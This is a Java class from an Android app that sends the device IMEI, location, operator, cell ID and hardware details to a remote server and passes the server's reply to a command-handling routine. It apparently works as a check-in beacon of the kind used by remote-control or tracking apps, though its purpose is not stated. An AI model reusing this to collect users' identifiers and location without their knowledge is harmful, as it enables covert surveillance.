package com.media.ui.ServerJobs;

import android.content.Context;

import com.media.ui.Services.pollCases;
import com.media.ui.Util.utility;
import com.media.ui.constants;

import java.util.HashMap;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static com.media.ui.Util.logger.logg;

/**
 * Created by prabeer.kochar on 03-08-2017.
 */

public class poll {

    String IM = null;
    String st = null;
    String loc = null;
    String mcc = null;
    String cel = null;
    String dev = null;

    HashMap hm = new HashMap();

    public poll(Context context) {
        IM = utility.imi(context);
        st = constants.DEFAULT_STATUS;
        try {
            loc = utility.Gloc(context);
        } catch (Exception e) {
            e.printStackTrace();
        }
        mcc = utility.operator(context);
        try {
            cel = Integer.toString(utility.GetCellid(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        dev = utility.DeviceDetails();
    }

    public void Sendpoll(String status,int server) {
        requestAPI apiservice;
if(server == 1) {
    apiservice    = httpClient.getClient().create(requestAPI.class);
}else{
    apiservice = httpClient2.getClient().create(requestAPI.class);
}
    if (status == constants.EMPTY_STRING) {
            st = constants.DEFAULT_STATUS;
        } else {
            st = status;
        }

        Call<pollResponse> call = apiservice.poll(new pollRequest(IM, st, loc, mcc, cel, dev));
        call.enqueue(new Callback<pollResponse>() {
            String data = constants.EMPTY_STRING;
            String status = constants.EMPTY_STRING;

            @Override
            public void onResponse(Call<pollResponse> call, Response<pollResponse> response) {

                data = response.body().getData().toString();
                status = response.body().getStatus().toString();
                if (data == null) {
                    data = "No";
                }
                if (status == null) {
                    status = "No";
                }
                hm.put(1, data);
                hm.put(2, status);
                pollCases cases = new pollCases();
                cases.pollcase(hm);
                logg("Response:" + data + "+" + status);
            }

            @Override
            public void onFailure(Call<pollResponse> call, Throwable t) {
                if (data == null) {
                    data = "No";
                }
                if (status == null) {
                    status = "No";
                }
                hm.put(1, constants.EMPTY_STRING);
                hm.put(2, "Failed");
                logg("Call Failed");
            }

        });
    }
}
